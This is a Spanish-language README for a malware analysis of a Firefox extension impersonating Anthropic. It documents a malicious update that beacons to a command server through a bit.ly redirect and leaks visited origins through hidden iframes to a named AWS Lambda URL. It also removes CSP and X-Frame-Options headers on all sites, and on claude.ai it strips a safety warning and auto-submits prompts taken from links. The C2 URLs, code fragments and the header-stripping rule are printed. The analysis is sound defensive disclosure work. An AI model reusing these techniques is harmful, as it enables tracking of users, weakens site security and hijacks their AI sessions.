# Default Search with Anthropic (Firefox) — análisis de una actualización maliciosa

*[English version](README.md)*

Una extensión de Firefox publicada en addons.mozilla.org bajo el nombre **Default Search with
Anthropic** incorporó código malicioso en su versión **2.1.9**. Está firmada por Mozilla, declara
`data_collection_permissions: ["none"]` y, al momento de escribir esto, sigue siendo la versión que
se entrega a quien la instale.

El código malicioso no estaba presente en el momento de la instalación. Llegó por actualización
automática doce días después de una instalación limpia. Las reseñas previas de la ficha señalan que
la extensión no es oficial y que suplanta a Anthropic, pero ninguna publicación describe el
comportamiento que se documenta.

Este repositorio contiene el análisis, los indicadores y la muestra.

| | |
|---|---|
| Nombre en la tienda | Default Search with Anthropic |
| Nombre en el manifiesto | Claude Search |
| Identificador | `{2dcb0f8a-f9de-4b46-899b-e11f8efc92f4}` |
| Versión afectada | 2.1.9 (manifest v3) |
| Ficha en AMO | `addons.mozilla.org/en-US/firefox/addon/default-claude-ai/` |
| Paquete | `/firefox/downloads/file/4946688/default_claude_ai-2.1.9.xpi` |
| Estado de firma | Firmada por Mozilla (`signedState: 2`) |
| Recolección declarada | `["none"]` |
| SHA-256 (.xpi) | `dffd082ebeed92bf05a17cd05061198d5e6822b2179eb8c5d8fc1612eb526946` |

## Historial de versiones

AMO muestra tres versiones publicadas. El salto de tamaño del 2026-08-08, publicado el mismo día que
la 2.1.6 y saltándose la 2.1.7 y la 2.1.8, corresponde al código añadido.

| Versión | Publicada | Tamaño |
|---|---|---|
| 2.1.5 | 2026-06-15 | 76.11 KB |
| 2.1.6 | 2026-08-08 | 76.12 KB |
| 2.1.9 | 2026-08-08 | **80.34 KB** |

## Cronología en el equipo analizado

Todas las horas en UTC.

| Marca temporal | Suceso |
|---|---|
| 2026-07-28 14:46:34 | Instalada desde la ficha de AMO. Compilación limpia. |
| 2026-08-09 22:44:16 | Actualización automática a 2.1.9. Las cookies del C2 se crean en ese mismo segundo. |
| 2026-08-09 → 09-15 | 36 días de operación, sondeando cada 8 minutos mientras el navegador estuvo abierto. |
| 2026-09-15 01:34:15 | Último contacto registrado con el C2. |
| 2026-09-15 01:34:40 | Extensión eliminada. |

La cookie `ts` que el C2 reescribía en cada sondeo se detuvo 25 segundos antes de la desinstalación y
no volvió a actualizarse, lo que confirma de forma independiente que la baliza murió con ella.

## Comportamiento

### 1. Canal de configuración remota

Cada 8 minutos la extensión solicita su configuración a través de un acortador de enlaces:

```js
fetch('https://bit.ly/release_note_for_claude', { credentials: 'include', cache: 'no-store' })
    → 301 → https://stable-channel.zeabur.app/?j=release_note
```

`credentials: 'include'` no hace falta para descargar una configuración. Permite que el servidor
deposite una cookie en el primer contacto y reconozca la misma instalación en cada sondeo posterior,
lo que constituye un identificador persistente de víctima. El acortador añade una capa de indirección
que permite mover el destino sin publicar una actualización.

La respuesta define dos campos controlados por el atacante: `u` (una URL de destino) y `h` (una lista
de cabeceras de respuesta a eliminar). El paquete incluye valores señuelo; los operativos solo llegan
por este canal, fuera del alcance de la revisión de la tienda.

```
Señuelo incluido en el paquete:
  h: ["x-claude-omnibox-hint", "etag-search-claude"]
  u: "https://claude.ai/"

Valores realmente recibidos del C2:
  h: ["content-security-policy", "x-frame-options"]
  u: "https://kmn6d3go6kuodubmfoiawcstl40ukbqb.lambda-url.us-west-2.on.aws/"
```

### 2. Filtración del perfil de navegación

Por cada origen visitado tres o más veces, con un enfriamiento de cinco minutos por origen, la
extensión inserta un iframe oculto de 0×0 apuntando al destino configurado y le pasa el origen
codificado en base64:

```
https://<destino>/?r=searchContextWarmup&i=MGNsYXU=&u=<base64(origen)>
                                         ^ identificador de campaña, descodifica a "0clau"
```

Solo se transmite el origen, no la URL completa. El servidor recibe además la IP del cliente, el
agente de usuario y la cookie identificadora.

El diseño apunta a segmentación en tiempo real más que a recolección masiva: el origen no se acumula
para subirlo por lotes, se envía como parámetro de una petición cuya respuesta se carga de inmediato,
lo que permite al servidor decidir qué devolver según el sitio. El umbral de tres visitas descarta la
navegación ocasional y retiene solo los servicios de uso habitual, y el enfriamiento limita el
volumen de forma deliberada.

Como estas peticiones se originan en la página de fondo de la extensión y no en una pestaña, no dejan
ninguna entrada en el historial de navegación.

### 3. Eliminación de cabeceras de seguridad en todo el navegador

A partir del campo `h`, la extensión registra una regla dinámica de `declarativeNetRequest` que
elimina las cabeceras indicadas de toda respuesta cargada en un marco anidado, en cualquier sitio:

```
id: 17391, priority: 1
action:    { type: 'modifyHeaders', responseHeaders: [
             { header: 'content-security-policy', operation: 'remove' },
             { header: 'x-frame-options',         operation: 'remove' } ] }
condition: { urlFilter: '*', resourceTypes: ['sub_frame'] }
```

Es el efecto de mayor alcance. Mientras la extensión esté instalada, la protección contra *framing*
queda desactivada para todos los sitios visitados, con independencia de lo que cada sitio configure.

### 4. Manipulación de la interfaz de claude.ai

El único script de contenido se ejecuta exclusivamente en `claude.ai` y realiza dos acciones
encadenadas:

1. Localiza y elimina del DOM el aviso de seguridad *"Use caution before running this prompt"*,
   manteniendo un `MutationObserver` activo durante 60 segundos para suprimirlo si reaparece.
2. Lee el parámetro `?q=` de la URL, lo escribe en el editor y pulsa el botón de enviar.

En conjunto, cualquier enlace `claude.ai/new?q=<texto>` se convierte en una instrucción que se ejecuta
sola dentro de la sesión autenticada del usuario, con la advertencia de seguridad retirada de la
pantalla antes de que pueda leerse.

## Límites de capacidad

Se auditó el manifiesto permiso por permiso. La extensión **no** solicita:

```
cookies    webRequest    history      bookmarks
downloads  nativeMessaging   scripting    proxy
```

En consecuencia no puede leer cookies ni credenciales, no puede leer el contenido de las páginas
visitadas (su único script de contenido está limitado a un solo dominio) y no puede leer los sitios
enmarcados: eliminar las cabeceras permite *enmarcar*, no *leer*, porque la política de mismo origen
sigue vigente. Este artefacto por sí solo no justifica una rotación de credenciales.

Los permisos concedidos son `storage`, `declarativeNetRequest`, `contextMenus`, `tabs` y
`clipboardWrite`, con permisos de host `https://claude.ai/*`, `*://*/*` y `<all_urls>`. Ni `tabs`
combinado con `<all_urls>` ni `declarativeNetRequest` son necesarios para la funcionalidad declarada.

## Cómo saber si estás afectado

Revisa `about:support` → Extensiones, o el directorio del perfil:

```sh
grep -rl '2dcb0f8a-f9de-4b46-899b-e11f8efc92f4' ~/.mozilla/firefox/*/extensions.json
```

En las compilaciones de Firefox que siguen las rutas XDG el perfil vive en
`~/.config/mozilla/firefox/`.

Si aparece, elimínala desde `about:addons`. Al desinstalarla se purgan también sus reglas dinámicas de
`declarativeNetRequest`, lo que restaura las cabeceras eliminadas. Comprueba después que
`<perfil>/extension-dnr/` esté vacío.

Borra luego las cookies residuales, que sobreviven a la desinstalación:

```
.bit.ly                     _bit
stable-channel.zeabur.app   v, ts
```

Quedan inertes una vez eliminada la extensión —no queda nada que las transmita— pero identifican al
equipo ante la infraestructura del operador en cualquier contacto futuro.

## Contenido

```
IOCS.md                        indicadores, listos para copiar
analysis/code-walkthrough.md   código anotado de los bloques maliciosos
samples/                       paquete firmado y fuentes extraídas, con hashes
scripts/                       utilidad para verificar que no se filtran datos del equipo
```

## Divulgación

Reportado a Mozilla (AMO), Anthropic (suplantación de marca y supresión de un aviso de seguridad
dentro de su producto), AWS (la Lambda Function URL) y Zeabur (host de configuración).

No aplica embargo de divulgación coordinada. Esto es malware activo, no una vulnerabilidad: el
operador ya sabe lo que hace su propio código, y retener el detalle solo prolonga la exposición de
quienes aún lo tienen instalado.

## Notas

Los hallazgos describen el comportamiento observado del paquete publicado. Nada de lo aquí escrito
afirma la identidad ni la intención de ninguna persona. Toda afirmación es reproducible a partir de la
muestra y los hashes de este repositorio.

## Licencia

Documentación y análisis bajo [CC BY 4.0](LICENSE). La muestra de `samples/` se incluye con fines de
investigación y no queda cubierta por esa licencia.
